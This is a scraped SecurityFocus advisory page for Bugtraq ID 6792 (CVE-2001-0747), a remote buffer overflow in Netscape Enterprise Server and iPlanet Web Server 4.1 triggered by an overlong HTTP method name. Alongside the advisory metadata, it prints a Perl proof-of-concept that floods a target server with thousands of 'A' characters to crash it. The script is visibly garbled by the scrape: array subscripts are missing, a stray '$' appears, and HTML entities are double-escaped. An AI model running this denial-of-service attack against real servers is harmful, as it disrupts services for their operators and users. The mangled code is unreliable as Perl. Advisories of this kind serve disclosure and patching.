@@ -1,0 +1,126 @@
+#SpeeDr00t@Black Falcon<br>#bid6792<p><b><span style="font-size: 18pt;">Netscape Enterprise Server HTTP Method Name Buffer Overflow Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/6792/info">info</a><br><a href="http://www.securityfocus.com/bid/6792/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/6792/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/6792/solution">solution</a><br><a href="http://www.securityfocus.com/bid/6792/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				6792
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2001-0747<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				May 19 2001 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 11 2009 08:06PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery of this vulnerability has been credited to: Robert Cardona &lt;dasquid@digizen-security.com&gt;
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Netscape Enterprise Server 4.1 SP7<br/>
+					
+				
+					Netscape Enterprise Server 4.1 SP6<br/>
+					
+				
+					Netscape Enterprise Server 4.1 SP5<br/>
+					
+				
+					Netscape Enterprise Server 4.1 SP4<br/>
+					
+				
+					Netscape Enterprise Server 4.1 SP3<br/>
+					
+				
+					iPlanet Web Server 4.1 SP7<br/>
+					
+				
+					iPlanet Web Server 4.1 SP6<br/>
+					
+				
+					iPlanet Web Server 4.1 SP5<br/>
+					
+				
+					iPlanet Web Server 4.1 SP4<br/>
+					
+				
+					iPlanet Web Server 4.1 SP3<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Netscape Enterprise Server 4.1 SP8<br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following proof of concept code was supplied by Robert Cardona &amp;lt;dasquid@digizen-security.com&amp;gt;:<br/><br/>#!/usr/bin/perl<br/>use IO::Socket;<br/>  if (@ARGV &amp;lt; 2)  {<br/>     print "Usage: host port\n";<br/>     exit;<br/>   }<br/>$overflow = "A" x $4022;<br/>&amp;amp;connect;<br/>sleep(15);<br/>&amp;amp;connect;<br/>exit;<br/>################################################<br/>sub connect() {<br/>  $sock= IO::Socket::INET-&amp;gt;new(Proto=&amp;gt;"TCP",<br/>			     PeerAddr=&amp;gt;$ARGV0,<br/>			     PeerPort=&amp;gt;"$ARGV1",)<br/>			     or die "Cant connect to $ARGV0: $!\n";<br/>  $sock-&amp;gt;autoflush(1);<br/>  print $sock "$overflow /index.html HTTP/1.0\n\n";<br/>  $response=&amp;lt;$sock&amp;gt;;<br/>  print "$response";<br/>  while(&amp;lt;$sock&amp;gt;){<br/>     print "$_\n";<br/>  }<br/>  close $sock;<br/>}
+	
+		<ul>
+</ul>
+</div>
